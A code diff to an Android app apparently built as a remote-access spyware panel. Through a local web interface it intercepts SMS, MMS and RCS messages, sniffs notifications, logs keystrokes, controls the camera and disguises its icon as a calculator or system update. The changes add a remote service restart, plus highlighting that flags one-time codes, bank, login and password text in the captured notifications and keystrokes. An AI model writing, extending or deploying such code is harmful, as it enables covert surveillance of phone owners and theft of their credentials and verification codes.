@@ -44,21 +44,32 @@ import fi.iki.elonen.NanoHTTPD;
 public class LabRatsHttpServer extends NanoHTTPD {
 
     private final Context context;
-    private static final List<String> systemLogs = new java.util.concurrent.CopyOnWriteArrayList<>();
+    private static final List<String> systemLogs = java.util.Collections.synchronizedList(new java.util.LinkedList<>());
     private static boolean logsLoaded = false;
     private static Context staticContext;
-    private static final Handler logSaveHandler = new Handler(Looper.getMainLooper());
-    private static final Runnable logSaveRunnable = LabRatsHttpServer::saveLogsInternal;
+    private static final java.util.concurrent.atomic.AtomicLong lastLogSaveTime = new java.util.concurrent.atomic.AtomicLong(0);
+    private static final SimpleDateFormat logTimeFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
 
     public static void logActivity(String msg) {
-        String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
+        String timestamp;
+        synchronized (logTimeFormat) {
+            timestamp = logTimeFormat.format(new Date());
+        }
         String logEntry = "[" + timestamp + "] " + msg;
-        systemLogs.add(0, logEntry);
-        while (systemLogs.size() > 100) systemLogs.remove(systemLogs.size() - 1);
         
-        // Debounced Save: Prevent disk thrashing during high-frequency events
-        logSaveHandler.removeCallbacks(logSaveRunnable);
-        logSaveHandler.postDelayed(logSaveRunnable, 1500);
+        synchronized (systemLogs) {
+            systemLogs.add(0, logEntry);
+            if (systemLogs.size() > 100) {
+                systemLogs.remove(systemLogs.size() - 1);
+            }
+        }
+        
+        // Background Save Throttling: Commits to disk at most once every 3 seconds
+        long now = System.currentTimeMillis();
+        if (now - lastLogSaveTime.get() > 3000) {
+            lastLogSaveTime.set(now);
+            LabRatsWorker.execute(LabRatsHttpServer::saveLogsInternal);
+        }
     }
 
     private void loadPersistentData() {
@@ -80,11 +91,15 @@ public class LabRatsHttpServer extends NanoHTTPD {
         }
     }
 
-    private static synchronized void saveLogsInternal() {
+    private static void saveLogsInternal() {
         if (staticContext == null) return;
         try {
             org.json.JSONArray array = new org.json.JSONArray();
-            for (String log : systemLogs) {
+            List<String> logsCopy;
+            synchronized (systemLogs) {
+                logsCopy = new java.util.ArrayList<>(systemLogs);
+            }
+            for (String log : logsCopy) {
                 array.put(log);
             }
             staticContext.getSharedPreferences("LabRATSSettings", Context.MODE_PRIVATE)
@@ -543,7 +558,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         // Ensures "every reload requires a login" for security
         sessionToken = java.util.UUID.randomUUID().toString();
 
-        loadPersistentData();
+        LabRatsWorker.execute(this::loadPersistentData);
     }
 
     @Override
@@ -661,6 +676,18 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         response = stopVideoRecording();
                     } else if (uri.equals("/camera/status")) {
                         response = serveCameraStatus();
+                    } else if (uri.equals("/terminal/restart")) {
+                        logActivity("SECURITY_MAINTENANCE: Initiating remote service restart...");
+                        new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                            Intent intent = new Intent(context, HttpServerService.class);
+                            intent.setAction("START");
+                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                                context.startForegroundService(intent);
+                            } else {
+                                context.startService(intent);
+                            }
+                        }, 500);
+                        response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else if (uri.equals("/terminal/clear-logs")) {
                         systemLogs.clear();
                         saveLogsInternal();
@@ -668,7 +695,11 @@ public class LabRatsHttpServer extends NanoHTTPD {
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true}");
                     } else if (uri.equals("/terminal/logs")) {
                         org.json.JSONArray array = new org.json.JSONArray();
-                        for (String log : systemLogs) {
+                        List<String> logsCopy;
+                        synchronized (systemLogs) {
+                            logsCopy = new java.util.ArrayList<>(systemLogs);
+                        }
+                        for (String log : logsCopy) {
                             array.put(log);
                         }
                         response = newFixedLengthResponse(Response.Status.OK, "application/json", array.toString());
@@ -828,10 +859,15 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">ACTIVE_SESSION_LOGS</h3>");
         html.append("<div id=\"log-terminal\" style=\"background: #000; padding: 20px; border-radius: 12px; font-size: 0.8rem; color: var(--terminal-green); line-height: 1.8; font-family: 'JetBrains Mono', monospace; height: 300px; overflow-y: auto; border: 1px solid rgba(0, 242, 255, 0.1);\">");
 
-        if (systemLogs.isEmpty()) {
+        List<String> logsSnapshot;
+        synchronized (systemLogs) {
+            logsSnapshot = new java.util.ArrayList<>(systemLogs);
+        }
+
+        if (logsSnapshot.isEmpty()) {
             html.append("<div>[WAITING] Uplink established. Bridge active...</div>");
         } else {
-            for (String log : systemLogs) {
+            for (String log : logsSnapshot) {
                 html.append("<div>").append(escapeHtml(log)).append("</div>");
             }
         }
@@ -840,11 +876,13 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<div style=\"margin-top: 15px; text-align: right; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px;\">");
         html.append("<span style=\"font-size: 0.65rem; color: #888;\">AUTO_REFRESH_ACTIVE</span>");
         html.append("<div style=\"display: flex; gap: 10px; flex-wrap: wrap; justify-content: flex-end; flex-grow: 1;\">");
+        html.append("<button onclick=\"restartServer()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: var(--neon-yellow); color: var(--neon-yellow); background: rgba(255, 255, 0, 0.05); margin-bottom: 0;\">RESTART_SERVER</button>");
         html.append("<button onclick=\"clearLogs()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); margin-bottom: 0;\">CLEAR_LOGS</button>");
         html.append("<button onclick=\"location.reload()\" class=\"btn btn-small\" style=\"border-radius: 12px; border-color: rgba(0, 242, 255, 0.3); margin-bottom: 0;\">REFRESH_LOGS</button>");
         html.append("</div>");
         html.append("</div>");
         html.append("<script>");
+        html.append("  function restartServer() { if(confirm('Refresh background service? Interface will temporarily disconnect.')) { fetch('/terminal/restart'); setTimeout(() => location.reload(), 2500); } }");
         html.append("  function clearLogs() { if(confirm('Clear all session logs?')) fetch('/terminal/clear-logs').then(() => location.reload()); }");
         html.append("  async function refreshLogs() {");
         html.append("    try {");
@@ -868,7 +906,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<h3 class=\"password-title\" style=\"font-size: 0.8rem; opacity: 0.7; color: var(--neon-orange);\">CHANGE_INTERFACE_PASSWORD</h3>");
         html.append("<div style=\"margin-top: 15px;\">");
         html.append("<form action=\"/settings/password\" method=\"POST\" style=\"display: flex; gap: 10px; align-items: center; flex-wrap: wrap;\">");
-        html.append("<input type=\"password\" name=\"new_password\" placeholder=\"NEW_PASSWORD\" style=\"background: #000; border: 1px solid var(--neon-orange); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; flex-grow: 1; min-width: 200px;\">");
+        html.append("<input type=\"password\" name=\"new_password\" placeholder=\"NEW_PASSWORD\" style=\"background: #000; border: 1px solid var(--neon-orange); color: #fff; padding: 10px; border-radius: 8px; outline: none; font-family: monospace; flex-grow: 1; max-width: 450px; min-width: 200px;\">");
         html.append("<button type=\"submit\" class=\"btn\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05); padding: 10px 20px; font-size: 0.7rem;\">CHANGE_PASSWORD</button>");
         html.append("</form>");
         html.append("</div>");
@@ -943,6 +981,35 @@ public class LabRatsHttpServer extends NanoHTTPD {
             .append("</h2>");
         html.append("<span style=\"font-size: 0.7rem; color: var(--neon-green); opacity: 0.8;\">MODE: SECURE_ACCESS</span>");
         html.append("</div>");
+
+        // --- ADD SEARCH & FILTERS ---
+        html.append("<div style=\"margin-bottom: 25px;\">");
+        html.append("<input type=\"text\" id=\"file-search\" placeholder=\"SEARCH_FILES_OR_EXTENSIONS...\" onkeyup=\"filterFiles()\" style=\"width:100%; max-width:450px; display:block; margin:0 auto 15px auto; background:rgba(0,0,0,0.5); border:1px solid var(--neon-cyan); color:white; padding:15px; border-radius:12px; font-family:monospace;\">");
+        html.append("<div style=\"display:flex; gap:8px; flex-wrap:wrap; justify-content:center;\">");
+        html.append("<button onclick=\"setFilter('all')\" class=\"btn btn-small\" style=\"border-color:var(--neon-cyan); color:var(--neon-cyan);\">ALL</button>");
+        html.append("<button onclick=\"setFilter('JPG,PNG,WEBP')\" class=\"btn btn-small\">IMAGES</button>");
+        html.append("<button onclick=\"setFilter('MP4,MOV')\" class=\"btn btn-small\">VIDEO</button>");
+        html.append("<button onclick=\"setFilter('PDF,DOC,TXT')\" class=\"btn btn-small\">DOCS</button>");
+        html.append("</div></div>");
+        
+        html.append("<script>");
+        html.append("function filterFiles() {");
+        html.append("  const val = document.getElementById('file-search').value.toLowerCase();");
+        html.append("  document.querySelectorAll('.file-item').forEach(item => {");
+        html.append("    const name = item.querySelector('.file-name').textContent.toLowerCase();");
+        html.append("    item.style.display = name.includes(val) ? 'flex' : 'none';");
+        html.append("  });");
+        html.append("}");
+        html.append("function setFilter(exts) {");
+        html.append("  if(exts === 'all') { document.querySelectorAll('.file-item').forEach(i => i.style.display = 'flex'); return; }");
+        html.append("  const list = exts.split(',');");
+        html.append("  document.querySelectorAll('.file-item').forEach(item => {");
+        html.append("    const name = item.querySelector('.file-name').textContent.toUpperCase();");
+        html.append("    const matches = list.some(e => name.endsWith(e));");
+        html.append("    item.style.display = matches ? 'flex' : 'none';");
+        html.append("  });");
+        html.append("}");
+        html.append("</script>");
 
         File[] files = currentDir.listFiles();
         if (files != null && files.length > 0) {
@@ -2792,12 +2859,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<h2 style=\"margin-bottom: 20px;\">&#128233; SMS Terminal</h2>");
         html.append("<p style=\"color: #888; font-size: 0.8rem; margin-bottom: 20px;\"><b>Note:</b> RCS and Advanced Messaging (Blue Bubbles) are intercepted in real-time in the <a href=\"/intel\" style=\"color: var(--neon-cyan);\">Intel Tab</a>.</p>");
         html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
-        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px;\">&#128231; Send New Message</h3>");
+        html.append("<h3 style=\"font-size: 1rem; margin-bottom: 15px; text-align: center;\">&#128231; Send New Message</h3>");
         html.append("<form action=\"/sms/send\" method=\"get\">");
-        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px;\">");
-        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
-        html.append("<textarea name=\"message\" placeholder=\"Message Content\" rows=\"3\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
-        html.append("<button type=\"submit\" style=\"align-self: flex-start;\">ENCRYPT & SEND</button>");
+        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
+        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
+        html.append("<textarea name=\"message\" placeholder=\"Message Content\" rows=\"3\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
+        html.append("<button type=\"submit\" style=\"align-self: center;\">ENCRYPT & SEND</button>");
         html.append("</div></form></div>");
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
@@ -2881,16 +2948,16 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; MMS Terminal</h2>");
         
         html.append("<div style=\"background: rgba(0, 242, 255, 0.05); padding: 20px; border: 1px solid var(--neon-cyan); border-radius: 8px; margin-bottom: 30px;\">");
-        html.append("<h3 style=\"font-size: 0.85rem; margin-bottom: 15px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;\">&#128247; Send New Multimedia Message</h3>");
+        html.append("<h3 style=\"font-size: 0.85rem; margin-bottom: 15px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; text-align: center;\">&#128247; Send New Multimedia Message</h3>");
         html.append("<form action=\"/mms/send\" method=\"post\" enctype=\"multipart/form-data\">");
-        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px;\">");
-        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
-        html.append("<textarea name=\"message\" placeholder=\"Message Content (Optional)\" rows=\"2\" style=\"background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
-        html.append("<div style=\"display: flex; align-items: center; gap: 10px;\">");
+        html.append("<div style=\"display: flex; flex-direction: column; gap: 10px; align-items: center;\">");
+        html.append("<input type=\"text\" name=\"number\" placeholder=\"Target Phone Number\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace;\">");
+        html.append("<textarea name=\"message\" placeholder=\"Message Content (Optional)\" rows=\"2\" style=\"width:100%; max-width:450px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 10px; border-radius: 12px; font-family: 'JetBrains Mono', monospace;\"></textarea>");
+        html.append("<div style=\"display: flex; align-items: center; gap: 10px; justify-content: center;\">");
         html.append("<span style=\"color: #888; font-size: 0.8rem;\">Attach Media (Max 1MB):</span>");
         html.append("<input type=\"file\" name=\"media\" accept=\"image/*,video/*,audio/*\" style=\"color: #888; font-size: 0.8rem;\">");
         html.append("</div>");
-        html.append("<button type=\"submit\" style=\"align-self: flex-start;\">UPLOAD & DISPATCH</button>");
+        html.append("<button type=\"submit\" style=\"align-self: center;\">UPLOAD & DISPATCH</button>");
         html.append("</div></form></div>");
 
         if (context.checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
@@ -3111,17 +3178,32 @@ public class LabRatsHttpServer extends NanoHTTPD {
     private Response serveMmsMedia(String partId) {
         try {
             Uri uri = Uri.parse("content://mms/part/" + partId);
-            InputStream is = context.getContentResolver().openInputStream(uri);
-            if (is == null) return serve404();
             String mimeType = "application/octet-stream";
             try (Cursor c = context.getContentResolver().query(uri, new String[]{"ct"}, null, null, null)) {
                 if (c != null && c.moveToFirst()) {
                     mimeType = c.getString(0);
                 }
-            } catch (Exception e) {
-                Log.e("LabRATS", "Error getting MMS media mime type", e);
-            }
-            return newFixedLengthResponse(Response.Status.OK, mimeType, is, is.available());
+            } catch (Exception ignored) {}
+
+            InputStream is = context.getContentResolver().openInputStream(uri);
+            if (is == null) return serve404();
+
+            // Calculate size correctly for large media/videos
+            long size = -1;
+            try {
+                android.content.res.AssetFileDescriptor afd = context.getContentResolver().openAssetFileDescriptor(uri, "r");
+                if (afd != null) {
+                    size = afd.getLength();
+                    afd.close();
+                }
+            } catch (Exception ignored) {}
+
+            // Fallback for size if AFD fails
+            if (size <= 0) size = is.available();
+
+            Response res = newFixedLengthResponse(Response.Status.OK, mimeType, is, size);
+            res.addHeader("Accept-Ranges", "bytes"); // Helpful for video seeking
+            return res;
         } catch (Exception e) { return serveError("Failed to load media: " + e.getMessage()); }
     }
 
@@ -3232,9 +3314,30 @@ public class LabRatsHttpServer extends NanoHTTPD {
             for (int i = offset; i < Math.min(offset + limit, totalCount); i++) {
                 NotificationSniffer.NotificationData n = notifications.get(i);
                 String time = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date(n.timestamp));
-                html.append("<tr>")
+                
+                // --- SENSITIVE DATA HIGHLIGHTING ---
+                String payload = (n.title + " " + n.text).toLowerCase();
+                
+                // Exclude common system noise like "USB for file transfer"
+                boolean isSystemNoise = payload.contains("usb") || payload.contains("charging");
+                
+                boolean isSensitive = !isSystemNoise && (
+                                    payload.contains("otp") || 
+                                    payload.contains("code") || 
+                                    payload.contains("verification") || 
+                                    payload.contains("bank") || 
+                                    payload.contains("login") || 
+                                    payload.contains("password") ||
+                                    (payload.contains("transfer") && !payload.contains("file")) || 
+                                    payload.contains("confirm"));
+                
+                String rowStyle = isSensitive ? "style=\"border-left: 3px solid var(--danger); background: rgba(255, 49, 49, 0.05);\"" : "";
+                String alertBadge = isSensitive ? "<span style=\"color:var(--danger); font-size:0.6rem; display:block; margin-bottom:5px; font-weight:bold; letter-spacing:1px;\">&#9888; SENSITIVE_INTEL_DETECTED</span>" : "";
+
+                html.append("<tr ").append(rowStyle).append(">")
                     .append("<td style=\"color:var(--neon-green); font-weight:bold;\">").append(escapeHtml(n.packageName)).append("</td>")
                     .append("<td>")
+                    .append(alertBadge)
                     .append("<div style=\"color:#fff; font-weight:bold; margin-bottom:4px;\">").append(escapeHtml(n.title)).append("</div>")
                     .append("<div style=\"font-size:0.8rem; opacity:0.8;\">").append(escapeHtml(n.text)).append("</div>")
                     .append("</td>")
@@ -3389,6 +3492,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 logActivity("STEALTH_EXECUTION: Stealth Mode ENABLED (" + type + ")");
                 pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 pm.setComponentEnabledSetting(targetAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+                
+                // Trigger notification update
+                Intent refreshIntent = new Intent(context, HttpServerService.class);
+                refreshIntent.setAction("START");
+                context.startService(refreshIntent);
+
                 return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"stealth\", \"type\": \"" + type + "\", \"hidden\": true}");
             } else {
                 // Restore Main Icon and disable ALL decoys
@@ -3398,6 +3507,12 @@ public class LabRatsHttpServer extends NanoHTTPD {
                 pm.setComponentEnabledSetting(weatherAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 pm.setComponentEnabledSetting(settingsAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP);
                 pm.setComponentEnabledSetting(mainAlias, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED, android.content.pm.PackageManager.DONT_KILL_APP);
+
+                // Trigger notification update
+                Intent refreshIntent = new Intent(context, HttpServerService.class);
+                refreshIntent.setAction("START");
+                context.startService(refreshIntent);
+
                 return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"status\": \"success\", \"mode\": \"normal\", \"hidden\": false}");
             }
         } catch (Exception e) {
@@ -3556,9 +3671,9 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("<h2 style=\"color: var(--neon-orange); font-size: 0.95rem;\">STEALTH_OPERATIONS</h2>");
         html.append("<p style=\"color: #888; margin-bottom: 20px;\">Manage advanced app camouflage. Choose an identity from the library. Each identity includes a <b>fully functional decoy interface</b>. Use dial pad code <b>*#1337#</b> or find the hidden 10-tap backdoor to restore access.</p>");
         
-        html.append("<div style=\"margin-bottom: 15px;\">");
-        html.append("<label class=\"info-label\">MASQUERADE_IDENTITY:</label>");
-        html.append("<select id=\"stealth-type\" style=\"width:100%; background:#000; border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
+        html.append("<div style=\"margin-bottom: 15px; display: flex; flex-direction: column; align-items: center;\">");
+        html.append("<label class=\"info-label\" style=\"align-self: center;\">MASQUERADE_IDENTITY:</label>");
+        html.append("<select id=\"stealth-type\" style=\"width:100%; max-width:450px; background:#000; border:1px solid var(--neon-orange); color:#fff; padding:10px; border-radius:8px; outline:none; font-family:monospace; margin-top:5px;\">");
         html.append("<option value=\"update\">System Update (Status Gear)</option>");
         html.append("<option value=\"calc\">Calculator (Apple Style)</option>");
         html.append("<option value=\"weather\">Weather (Blue Sky Forecast)</option>");
@@ -3566,7 +3681,7 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("</select>");
         html.append("</div>");
 
-        html.append("<div class=\"btn-container\" style=\"display:flex; flex-direction:column; gap:10px; align-items: flex-start;\">");
+        html.append("<div class=\"btn-container\" style=\"display:flex; flex-direction:column; gap:10px; align-items: center;\">");
         html.append("<button onclick=\"toggleStealth()\" class=\"btn btn-small\" style=\"border-color: var(--neon-orange); color: var(--neon-orange); background: rgba(255, 157, 0, 0.05); border-radius:12px; padding: 10px 25px;\">INITIATE_STEALTH</button>");
         html.append("<button onclick=\"restoreNormal()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); border-radius:12px; padding: 10px 25px;\">RESTORE_NORMAL</button>");
         html.append("</div>");
@@ -3671,9 +3786,22 @@ public class LabRatsHttpServer extends NanoHTTPD {
         html.append("function ghostAction(a) { fetch('/ghost/interact?action='+a); }");
         html.append("function clearGhostLogs() { if(confirm('Purge captured keystrokes?')) fetch('/ghost/clear').then(() => refreshGhostLogs()); }");
         html.append("async function refreshGhostLogs() {");
-        html.append("  const r = await fetch('/ghost/keys'); const data = await r.json();");
-        html.append("  const term = document.getElementById('ghost-terminal');");
-        html.append("  if(data.keys.length > 0) term.innerHTML = data.keys.join('');");
+        html.append("  try {");
+        html.append("    const r = await fetch('/ghost/keys'); const data = await r.json();");
+        html.append("    const term = document.getElementById('ghost-terminal');");
+        html.append("    if(!term) return;");
+        html.append("    if(data.keys.length > 0) {");
+        html.append("      const isAtBottom = (term.scrollHeight - term.scrollTop) <= (term.clientHeight + 10);");
+        html.append("      let esc = data.keys.join('').replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');");
+        html.append("      const keys = ['otp', 'password', 'login', 'user', 'email', 'bank', 'transfer', 'confirm', 'pin', 'code'];");
+        html.append("      keys.forEach(k => {");
+        html.append("        const reg = new RegExp('(' + k + ')', 'gi');");
+        html.append("        esc = esc.replace(reg, '<span style=\"color:var(--danger); font-weight:bold; text-shadow: 0 0 5px rgba(255,49,49,0.5);\">$1</span>');");
+        html.append("      });");
+        html.append("      term.innerHTML = esc;");
+        html.append("      if (isAtBottom) { term.scrollTop = term.scrollHeight; }");
+        html.append("    }");
+        html.append("  } catch(e) {}");
         html.append("}");
         html.append("async function checkGhostStatus() {");
         html.append("  try {");
